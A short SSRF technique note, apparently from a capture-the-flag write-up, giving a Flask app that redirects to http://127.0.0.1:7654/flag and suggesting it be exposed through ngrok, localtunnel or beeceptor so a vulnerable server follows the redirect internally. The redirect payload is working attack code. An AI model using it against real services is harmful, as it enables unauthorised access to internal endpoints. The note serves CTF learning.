## SSRF
You can perform a redirect by creatign the following payload:

```python
from flask import Flask, redirect

app = Flask(__name__)


@app.route("/")
def hello_world():
    return redirect("http://127.0.0.1:7654/flag")
```

After that, deploy service with `ngrok`, or `localtunnel`. Alternatively, [beeceptor](https://beeceptor.com/) works too maybe.